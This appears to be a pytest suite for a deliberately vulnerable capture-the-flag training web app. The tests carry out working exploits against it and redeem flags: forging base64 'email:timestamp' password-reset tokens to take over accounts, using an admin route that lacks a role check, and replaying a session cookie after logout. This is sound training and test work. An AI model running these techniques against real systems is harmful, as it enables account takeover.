import base64

import requests


def test_privesc_teach(devon, base_url, extract_flag_fn, redeem_flag_fn):
    # meter id 2 doesn't belong to devon -- disconnecting it as a plain
    # customer (no role=admin check on this route) is the escalation.
    resp = devon.post(f"{base_url}/admin/meters/2/disconnect", timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(devon, base_url, flag)


def test_oldtoken_exercise(anon_session, base_url, extract_flag_fn, redeem_flag_fn):
    token = base64.urlsafe_b64encode(b"ben.wood@example.com:1000").decode()
    resp = anon_session.post(
        f"{base_url}/reset-password",
        data={"token": token, "password": "pwned-by-test-suite"},
        timeout=10,
    )
    assert resp.status_code == 200
    assert "FLAG{" not in resp.text

    login_resp = anon_session.post(
        f"{base_url}/login",
        data={"email": "ben.wood@example.com", "password": "pwned-by-test-suite"},
        timeout=10,
    )
    assert login_resp.status_code == 200
    flag = extract_flag_fn(login_resp.text)
    assert redeem_flag_fn(anon_session, base_url, flag)


def test_oldtoken_exercise_fresh_timestamp_also_counts(anon_session, base_url, extract_flag_fn, redeem_flag_fn):
    import time

    fresh_token = base64.urlsafe_b64encode(f"harun.lee@example.com:{int(time.time())}".encode()).decode()
    resp = anon_session.post(
        f"{base_url}/reset-password",
        data={"token": fresh_token, "password": "pwned-by-test-suite-2"},
        timeout=10,
    )
    assert resp.status_code == 200

    login_resp = anon_session.post(
        f"{base_url}/login",
        data={"email": "harun.lee@example.com", "password": "pwned-by-test-suite-2"},
        timeout=10,
    )
    assert login_resp.status_code == 200
    flag = extract_flag_fn(login_resp.text)
    assert redeem_flag_fn(anon_session, base_url, flag)


def test_sessionreuse_bonus(login_fn, alice, base_url, redeem_flag_fn, participant_id):
    session, _ = login_fn("carla.clark@example.com", "carla123")
    token = session.cookies.get("wgs_session")
    assert token, "expected a wgs_session cookie after login"

    logout_resp = session.post(f"{base_url}/logout", timeout=10)
    assert logout_resp.status_code in (200, 302)

    # Replay the captured (now logged-out) token manually.
    replay = requests.Session()
    replay.verify = False
    replay.cookies.set("wgs_session", token)
    replay.cookies.set("wg_pid", participant_id)
    resp = replay.get(f"{base_url}/dashboard", timeout=10)
    flag = resp.cookies.get("flag_session_reuse")
    assert flag
    assert redeem_flag_fn(alice, base_url, flag)


def test_pwchange_teach(alice, base_url, extract_flag_fn, redeem_flag_fn):
    resp = alice.post(
        f"{base_url}/account/password",
        data={"new_password": "Str0ngP@ssw0rd-2026!"},
        headers={"Origin": base_url},
        timeout=10,
    )
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)


def test_pwchange_teach_requires_length_over_seven(login_fn, base_url):
    """A password change fires the flag only when the new password is longer than 7 characters."""
    import secrets

    import requests

    email = f"wgtest-{secrets.token_hex(4)}@example.com"
    requests.post(
        f"{base_url}/signup",
        data={"email": email, "password": "Str0ngPassw0rd", "name": "Hardening Test"},
        verify=False,
        timeout=10,
    )
    session, _ = login_fn(email, "Str0ngPassw0rd")

    resp = session.post(
        f"{base_url}/account/password",
        data={"new_password": "sh0rt12"},  # 7 characters exactly
        headers={"Origin": base_url},
        timeout=10,
    )
    assert resp.status_code == 200
    # A 7-character password is weak, but does not earn the password-change flag.
    assert "Weak passwords:" in resp.text
    assert "Broken authentication:" not in resp.text
